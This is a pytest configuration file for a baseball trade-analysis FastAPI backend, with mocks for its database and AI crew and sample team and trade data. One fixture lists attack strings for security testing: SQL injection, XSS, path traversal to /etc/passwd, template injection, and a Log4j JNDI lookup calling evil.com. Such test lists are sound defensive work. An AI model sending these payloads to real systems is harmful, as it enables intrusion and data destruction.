"""
Pytest configuration and fixtures for Baseball Trade AI backend tests
"""

import pytest
import asyncio
from typing import Dict, Any, AsyncGenerator
from unittest.mock import Mock, AsyncMock, patch
import uuid
from datetime import datetime

# Test fixtures for database and API testing
@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture
def mock_supabase_service():
    """Mock Supabase service for testing"""
    with patch('backend.services.supabase_service.supabase_service') as mock:
        # Mock successful team lookup
        mock.get_team_by_key.return_value = {
            'id': 1,
            'team_key': 'yankees',
            'name': 'New York Yankees',
            'abbreviation': 'NYY',
            'division': 'AL East',
            'league': 'American League'
        }
        
        # Mock successful analysis creation
        mock.create_trade_analysis.return_value = "test-analysis-id"
        
        # Mock analysis retrieval
        mock.get_trade_analysis.return_value = {
            'id': 1,
            'analysis_id': 'test-analysis-id',
            'requesting_team_id': 1,
            'request_text': 'Test trade request',
            'status': 'queued',
            'created_at': datetime.now(),
            'results': None,
            'error_message': None
        }
        
        # Mock team listing
        mock.get_all_teams.return_value = [
            {
                'id': 1,
                'team_key': 'yankees',
                'name': 'New York Yankees',
                'abbreviation': 'NYY',
                'city': 'New York',
                'division': 'AL East',
                'league': 'American League',
                'budget_level': 'high',
                'competitive_window': 'win-now',
                'market_size': 'large'
            }
        ]
        
        # Mock health check
        mock.health_check.return_value = {
            'status': 'healthy',
            'teams_count': 30,
            'players_count': 1000
        }
        
        yield mock

@pytest.fixture
def mock_front_office_crew():
    """Mock CrewAI front office crew for testing"""
    with patch('backend.crews.front_office_crew.FrontOfficeCrew') as mock_crew:
        mock_instance = Mock()
        mock_instance.analyze_trade_request = AsyncMock(return_value={
            'request': 'Test trade request',
            'requesting_team': 'yankees',
            'analysis_complete': True,
            'organizational_recommendation': {
                'overall_recommendation': 'Proceed with trade negotiations',
                'confidence_level': 'High',
                'priority_targets': [
                    {'player': 'Test Player A', 'team': 'Test Team 1', 'likelihood': 'Medium'}
                ]
            },
            'departments_consulted': ['Front Office Leadership', 'Scouting Department'],
            'analysis_timestamp': datetime.now().isoformat(),
            'duration_seconds': 2.5,
            'token_usage': 150,
            'estimated_cost': 0.02
        })
        mock_crew.return_value = mock_instance
        yield mock_instance

@pytest.fixture
def sample_trade_request():
    """Sample trade request for testing"""
    return {
        'team': 'yankees',
        'request': 'Looking for a starting pitcher with ERA under 4.0 and at least 3 years of team control',
        'urgency': 'medium',
        'budget_limit': 20000000,
        'include_prospects': True
    }

@pytest.fixture
def sample_team_data():
    """Sample team data for testing"""
    return {
        'id': 1,
        'team_key': 'yankees',
        'name': 'New York Yankees',
        'abbreviation': 'NYY',
        'city': 'New York',
        'division': 'AL East',
        'league': 'American League',
        'primary_color': '#132448',
        'secondary_color': '#C4CED4',
        'budget_level': 'high',
        'competitive_window': 'win-now',
        'market_size': 'large',
        'philosophy': 'Win-now with proven veterans'
    }

@pytest.fixture
def sample_analysis_response():
    """Sample analysis response for testing"""
    return {
        'analysis_id': 'test-analysis-id',
        'team': 'yankees',
        'original_request': 'Test trade request',
        'status': 'completed',
        'results': {
            'recommendations': [
                {
                    'player': 'Test Player A',
                    'team': 'Test Team 1',
                    'position': 'SP',
                    'likelihood': 'Medium'
                }
            ]
        },
        'departments_consulted': ['Front Office Leadership', 'Scouting Department'],
        'created_at': datetime.now(),
        'completed_at': datetime.now(),
        'error_message': None
    }

@pytest.fixture
def mock_trade_parser():
    """Mock trade request parser for testing"""
    with patch('backend.nlp.trade_parser.TradeRequestParser') as mock_parser:
        mock_instance = Mock()
        mock_instance.parse_trade_request.return_value = Mock(
            primary_need='starting_pitcher',
            secondary_needs=['relief_pitcher'],
            budget_constraints=20000000,
            urgency_level='medium',
            timeline='immediate',
            confidence_score=0.85,
            __dict__={
                'primary_need': 'starting_pitcher',
                'confidence_score': 0.85
            }
        )
        mock_parser.return_value = mock_instance
        yield mock_instance

@pytest.fixture
def test_client():
    """Create test client for FastAPI testing"""
    from fastapi.testclient import TestClient
    from backend.api.trade_analyzer_v2 import app
    
    client = TestClient(app)
    return client

@pytest.fixture
async def async_test_client():
    """Create async test client for FastAPI testing"""
    from httpx import AsyncClient
    from backend.api.trade_analyzer_v2 import app
    
    async with AsyncClient(app=app, base_url="http://test") as client:
        yield client

# Database test fixtures
@pytest.fixture
def mock_database_connection():
    """Mock database connection for testing"""
    with patch('backend.services.supabase_service.create_client') as mock_client:
        mock_instance = Mock()
        mock_instance.table.return_value = Mock()
        mock_client.return_value = mock_instance
        yield mock_instance

# Error simulation fixtures
@pytest.fixture
def database_error_mock():
    """Mock database errors for testing error handling"""
    def _create_error(operation: str):
        with patch(f'backend.services.supabase_service.supabase_service.{operation}') as mock_op:
            mock_op.side_effect = Exception(f"Database {operation} failed")
            return mock_op
    return _create_error

@pytest.fixture
def crew_ai_error_mock():
    """Mock CrewAI errors for testing error handling"""
    with patch('backend.crews.front_office_crew.FrontOfficeCrew') as mock_crew:
        mock_instance = Mock()
        mock_instance.analyze_trade_request = AsyncMock(side_effect=Exception("CrewAI analysis failed"))
        mock_crew.return_value = mock_instance
        yield mock_instance

# Performance testing fixtures
@pytest.fixture
def performance_monitor():
    """Monitor for performance testing"""
    import time
    
    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.end_time = None
        
        def start(self):
            self.start_time = time.time()
        
        def stop(self):
            self.end_time = time.time()
        
        @property
        def duration(self):
            if self.start_time and self.end_time:
                return self.end_time - self.start_time
            return None
    
    return PerformanceMonitor()

# Security testing fixtures  
@pytest.fixture
def malicious_input_samples():
    """Sample malicious inputs for security testing"""
    return [
        "'; DROP TABLE teams; --",
        "<script>alert('xss')</script>",
        "../../../../etc/passwd",
        "' OR 1=1 --",
        "javascript:alert('xss')",
        "\x00\x01\x02",  # Null bytes
        "A" * 10000,  # Large input
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4j injection
    ]

@pytest.fixture
def rate_limit_tester():
    """Helper for rate limiting tests"""
    class RateLimitTester:
        def __init__(self, client):
            self.client = client
            
        async def test_rate_limit(self, endpoint: str, limit: int, data: dict = None):
            """Test rate limiting by making requests beyond the limit"""
            responses = []
            for i in range(limit + 2):
                if data:
                    response = await self.client.post(endpoint, json=data)
                else:
                    response = await self.client.get(endpoint)
                responses.append(response)
            return responses
    
    return RateLimitTester

# Authentication testing fixtures
@pytest.fixture
def mock_jwt_token():
    """Mock JWT token for authentication testing"""
    return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0LXVzZXIiLCJleHAiOjk5OTk5OTk5OTl9.test_signature"

@pytest.fixture
def invalid_jwt_token():
    """Invalid JWT token for authentication testing"""
    return "invalid.jwt.token"

# Cleanup fixtures
@pytest.fixture(autouse=True)
async def cleanup():
    """Cleanup after each test"""
    yield
    # Cleanup any resources created during testing
    # This runs after each test
    pass